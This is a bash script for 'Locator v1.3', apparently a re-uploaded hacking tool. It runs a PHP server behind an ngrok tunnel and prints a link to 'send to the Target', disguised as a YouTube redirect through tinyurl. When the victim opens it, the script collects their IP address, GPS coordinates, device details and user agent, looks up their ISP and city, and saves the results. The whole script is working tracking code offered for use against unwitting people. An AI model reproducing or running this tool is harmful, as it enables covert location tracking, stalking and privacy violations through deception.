#!/bin/bash
# Locator v1.3
# Coded by: thelinuxchoice (You dont become a coder by just changing the credits)
# Re-Edited & Re-Uploaded By: kNIGHT
# Github: https://github.com/Ethical-Hacking-Zone/locator
# Github: https://github.com/thelinuxchoice/locator

trap 'printf "\n";stop;exit 1' 2

setup() {

read -p $'\n\e[1;96m Are You Running This Tool On Termux? (Y/N): \e[0m' ostype

if [[ $ostype -eq 'Y' || $ostype -eq 'y' ]]; then
echo -e "\e[4;95m Installing Dependencies.... \e[0m"
sleep 0.5
echo -e "\e[1;96m"
apt install openssh wget curl php toilet figlet unzip exa ruby
gem install lolcat
wget -O $PREFIX/share/figlet/ASCII-Shadow.flf https://raw.githubusercontent.com/xero/figlet-fonts/master/ANSI%20Shadow.flf
touch plugins.installed
echo -e "\e[3;94m Dependencies Installed!"
sleep 2

elif [[ $ostype -eq 'N' || $ostype -eq 'n' ]]; then
echo -e "\e[4;95m Installing Dependencies.... \e[0m"
sleep 0.5
echo -e "\[1;96m"
sudo apt install openssh wget curl php toilet figlet unzip ruby
gem install lolcat
wget -O $PREFIX/share/figlet/ASCII-Shadow.flf https://raw.githubusercontent.com/xero/figlet-fonts/master/ANSI%20Shadow.flf
touch plugins.installed
echo -e "\e[3;94m Dependencies Installed!"
sleep 2

fi

if [ -e "server/" ] ; then
echo -e "\e[1;92m Starting Tool...."
sleep 3
clear

else
	unzip server.zip
echo -e "\e[1;92m Starting Tool...."
sleep 3
clear

fi

}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
pkill -f -2 ssh > /dev/null 2>&1
killall ssh > /dev/null 2>&1
fi
if [[ -e sendlink ]]; then
rm -rf sendlink
fi



}




catch_cred() {

longitude=$(grep -o 'Longitude:.*' server/geolocate.txt | cut -d " " -f2 | tr -d ' ')
IFS=$'\n'
latitude=$(grep -o 'Latitude:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
altitude=$(grep -o 'Altitude:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
accuracy=$(grep -o 'Accuracy:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
hardware=$(grep -o 'Cores:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
speed=$(grep -o 'Speed:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
platform=$(grep -o 'Platform:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
heading=$(grep -o 'Heading:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
memory=$(grep -o 'Memory:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
useragent=$(grep -o 'User-Agent:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
height=$(grep -o 'Screen Height:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
width=$(grep -o 'Screen Width:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
printf "\n"
printf "\e[1;93m[\e[0m\e[1;92m:::\e[0m\e[1;93m]\e[0m\e[1;94m Geolocation:\n"
printf "\n"
printf "\e[1;94m[\e[0m\e[1;91m*\e[0m\e[1;94m]\e[0m\e[1;92m Latitude:\e[0m\e[1;77m %s\n\e[0m" $latitude
printf "\e[1;94m[\e[0m\e[1;91m*\e[0m\e[1;94m]\e[0m\e[1;92m Longitude:\e[0m\e[1;77m %s\n\e[0m" $longitude
printf "\e[1;94m[\e[0m\e[1;91m*\e[0m\e[1;94m]\e[0m\e[1;92m Altitude:\e[0m\e[1;77m %s\n\e[0m" $altitude
printf "\e[1;94m[\e[0m\e[1;91m*\e[0m\e[1;94m]\e[0m\e[1;92m Speed:\e[0m\e[1;77m %s\n\e[0m" $speed
printf "\e[1;94m[\e[0m\e[1;91m*\e[0m\e[1;94m]\e[0m\e[1;92m Heading:\e[0m\e[1;77m %s\n\e[0m" $heading
printf "\e[1;94m[\e[0m\e[1;91m*\e[0m\e[1;94m]\e[0m\e[1;92m Accuracy:\e[0m\e[1;77m %sm\n\e[0m" $accuracy
printf "\e[1;94m[\e[0m\e[1;91m*\e[0m\e[1;94m]\e[0m\e[1;92m Map:\e[0m\e[1;77m https://www.google.com/maps/place/%s+%s\n\e[0m" $latitude $longitude
printf "\n"
printf "\e[1;93m[\e[0m\e[1;92m:::\e[0m\e[1;93m]\e[0m\e[1;94m Device Info:\n"
printf "\n"
printf "\e[1;94m[\e[0m\e[1;91m*\e[0m\e[1;94m]\e[0m\e[1;92m Platform:\e[0m\e[1;77m %s\n\e[0m" $platform
printf "\e[1;94m[\e[0m\e[1;91m*\e[0m\e[1;94m]\e[0m\e[1;92m Cores:\e[0m\e[1;77m %s\n\e[0m" $hardware
printf "\e[1;94m[\e[0m\e[1;91m*\e[0m\e[1;94m]\e[0m\e[1;92m User-Agent:\e[0m\e[1;77m %s\n\e[0m" $useragent
printf "\e[1;94m[\e[0m\e[1;91m*\e[0m\e[1;94m]\e[0m\e[1;92m Memory:\e[0m\e[1;77m %s\n\e[0m" $memory
printf "\e[1;94m[\e[0m\e[1;91m*\e[0m\e[1;94m]\e[0m\e[1;92m Resolution:\e[0m\e[1;77m %sx%s\n\e[0m" $height $width
cat server/geolocate.txt >> server/saved.geolocate.txt
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m server/saved.geolocate.txt\e[0m\n" 
killall -2 php > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
killall ssh > /dev/null 2>&1
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
exit 1

}

getcredentials() {
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting Geolocation ...\e[0m\n"
while [ true ]; do


if [[ -e "server/geolocate.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Geolocation Found!\n"
catch_cred

fi
sleep 0.5
if [[ -e "server/error.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Error on Geolocation!\n"
checkerror=$(grep -o 'Error:.*' server/error.txt | cut -d " " -f2 | tr -d ' ' )
if [[ $checkerror == 1 ]]; then
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User Denied Geolocation ...\e[0m\n"

rm -rf server/error.txt
getcredentials
elif [[ $checkerror == 2 ]]; then
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Geolocation Unavailable ...\e[0m\n"

rm -rf server/error.txt
getcredentials
elif [[ $checkerror == 3 ]]; then
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Time Out ...\e[0m\n"

rm -rf server/error.txt
getcredentials
elif [[ $checkerror == 4 ]]; then
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Unknow Error ...\e[0m\n"

rm -rf server/error.txt
getcredentials
else
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Error reading file error.txt...\e[0m\n"
exit 1
fi
fi
sleep 0.5



done 


}

catch_ip() {
touch server/saved.geolocate.txt
ip=$(grep -a 'IP:' server/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' server/ip.txt | cut -d '"' -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Target IP:\e[0m\e[1;77m %s\e[0m\n" $ip
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m server/saved.ip.txt\e[0m\n"
cat server/ip.txt >> server/saved.ip.txt


if [[ -e iptracker.log ]]; then
rm -rf iptracker.log
fi

IFS='\n'
iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
IFS=$'\n'
continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
printf "\n"
hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
if [[ $hostnameip != "" ]]; then
printf "\e[1;92m[*] Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
fi
##

reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
if [[ $reverse_dns != "" ]]; then
printf "\e[1;92m[*] Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $reverse_dns
fi
##


if [[ $continent != "" ]]; then
printf "\e[1;92m[*] IP Continent:\e[0m\e[1;77m %s\e[0m\n" $continent
fi
##

country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
if [[ $country != "" ]]; then
printf "\e[1;92m[*] IP Country:\e[0m\e[1;77m %s\e[0m\n" $country
fi
##

state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
if [[ $state != "" ]]; then
printf "\e[1;92m[*] State:\e[0m\e[1;77m %s\e[0m\n" $state
fi
##
city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $city != "" ]]; then
printf "\e[1;92m[*] City Location:\e[0m\e[1;77m %s\e[0m\n" $city
fi
##

isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $isp != "" ]]; then
printf "\e[1;92m[*] ISP:\e[0m\e[1;77m %s\e[0m\n" $isp
fi
##

as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $as_number != "" ]]; then
printf "\e[1;92m[*] AS Number:\e[0m\e[1;77m %s\e[0m\n" $as_number
fi
##

ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $ip_speed != "" ]]; then
printf "\e[1;92m[*] IP Address Speed:\e[0m\e[1;77m %s\e[0m\n" $ip_speed
fi
##
ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $ip_currency != "" ]]; then
printf "\e[1;92m[*] IP Currency:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
fi
##
printf "\n"
rm -rf iptracker.log

getcredentials
}

##

start() {
if [[ -e server/ip.txt ]]; then
rm -rf server/ip.txt

fi
if [[ -e server/geolocate.txt ]]; then
rm -rf server/geolocate.txt

fi

if [[ -e server/error.txt ]]; then
rm -rf server/error.txt

fi
if [[ -e ngrok ]]; then
echo ""
else

printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget --no-check-certificate https://bin.equinox.io/a/e93TBaoFgZw/ngrok-2.2.8-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-2.2.8-linux-arm.zip ]]; then
unzip ngrok-2.2.8-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-2.2.8-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi



else
wget --no-check-certificate https://bin.equinox.io/a/e93TBaoFgZw/ngrok-2.2.8-linux-arm.zip > /dev/null 2>&1 
if [[ -e ngrok-2.2.8-linux-arm.zip ]]; then
unzip ngrok-2.2.8-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-2.2.8-linux-arm.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
php -t "server/" -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Target:\e[0m\e[1;77m %s\e[0m\n" $link
send_ip=$(curl -s "http://tinyurl.com/api-create.php?url=https://www.youtube.com/redirect?v=636B9Qh-fqU&redir_token=j8GGFy4s0H5jIRVfuChglne9fQB8MTU4MjM5MzM0N0AxNTgyMzA2OTQ3&event=video_description&q=$link" | head -n1)
#send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
printf '\n\e[1;92m[\e[0m\e[1;92m*\e[0m\e[1;92m] Or using tinyurl:\e[0m\e[1;77m %s\e[0m\n' $send_ip
printf "\n"

checkfound
}

checkfound() {

printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting target open the link ...\e[0m\n"
while [ true ]; do


if [[ -e "server/ip.txt" ]]; then
printf '\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n'
catch_ip

fi
sleep 1
done 

}

banner() {

toilet -F border:gay -f ASCII-Shadow Locator
echo -e '\e[1;96m                                                         v1.3 \e[0m'
echo -e '\e[1;96m :::\e[0m\e[1;93m Coded by: @linux_choice\e[0m'
echo -e '\e[1;96m :::\e[0m\e[1;93m Re-Edited & Re-Uploaded By: kNIGHT From @Ethical-Hacking-Zone'
echo -e '\e[1;96m :::\e[0m\e[1;93m Credits To: @GuArdiAn For Having The Script Before Repo Was Banned'
}

if [[ -f plugins.installed ]] ; then

clear
banner
start

else
	setup
	banner
	start
fi
